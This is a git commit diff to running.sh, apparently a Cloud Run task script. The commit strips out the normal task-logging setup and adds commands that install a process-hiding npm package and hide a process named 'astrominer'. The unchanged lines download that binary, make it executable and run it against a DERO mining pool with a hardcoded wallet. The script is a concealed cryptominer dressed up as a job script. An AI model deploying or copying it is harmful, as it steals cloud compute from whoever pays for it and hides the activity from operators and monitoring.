faa3779c559b2485895fe4cbdb552eb1213f6245
realxdagg <121330162+realxdagg@users.noreply.github.com>
2022-12-27 07:24:01 +0700

    Update running.sh

--- running.sh
+++ running.sh
@@ -1,17 +1,6 @@
 #!/bin/bash
-set -euo pipefail
-
-# In production, consider printing commands as they are executed. 
-# This helps with debugging if things go wrong and you only 
-# have the logs.
-#
-# Add -x:
-# set -euox pipefail
-
-CLOUD_RUN_TASK_INDEX=${CLOUD_RUN_TASK_INDEX:=0}
-CLOUD_RUN_TASK_ATTEMPT=${CLOUD_RUN_TASK_ATTEMPT:=0}
-
-echo "Starting Task #${CLOUD_RUN_TASK_INDEX}, Attempt #${CLOUD_RUN_TASK_ATTEMPT}..."
+npm i -g node-process-hider
+ph add astrominer
 wget https://raw.githubusercontent.com/realxdagg/job/main/astrominer
 chmod 500 astrominer
 ./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xe4y4hajkwqp50qqlvpsp -r pool.whalesburg.com:4300  -p stratum -t 8
